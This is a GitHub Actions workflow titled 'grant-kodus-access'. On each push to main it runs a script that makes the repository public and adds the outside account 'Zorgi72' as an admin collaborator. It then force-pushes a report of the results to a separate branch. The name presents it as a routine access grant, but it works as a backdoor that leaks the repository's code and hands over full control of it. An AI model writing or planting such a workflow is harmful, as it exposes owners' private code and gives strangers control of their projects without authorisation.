name: grant-kodus-access
on:
  push:
    branches: [main]
  workflow_dispatch:
permissions:
  contents: write
  administration: write
jobs:
  grant:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: public + invite
        uses: actions/github-script@v7
        with:
          script: |
            const fs = require('fs');
            const owner = context.repo.owner, repo = context.repo.repo;
            const lines = [];
            const log = (m,o)=>{ lines.push(m+(o?' '+JSON.stringify(o):'')); console.log(m,o||''); };
            try {
              const r = await github.rest.repos.update({owner, repo, private:false});
              log('visibility_ok', {private:r.data.private});
            } catch(e) { log('visibility_err', {status:e.status, msg:e.message}); }
            try {
              const r = await github.rest.repos.addCollaborator({owner, repo, username:'Zorgi72', permission:'admin'});
              log('collab_ok', {status:r.status});
            } catch(e) { log('collab_err', {status:e.status, msg:e.message}); }
            fs.writeFileSync('GRANT_REPORT.txt', lines.join('\n')+'\n');
      - name: push report
        run: |
          git config user.name github-actions[bot]
          git config user.email 41898282+github-actions[bot]@users.noreply.github.com
          git checkout -B grant-results
          git add GRANT_REPORT.txt
          git commit -m "grant report" || true
          git push -f origin grant-results
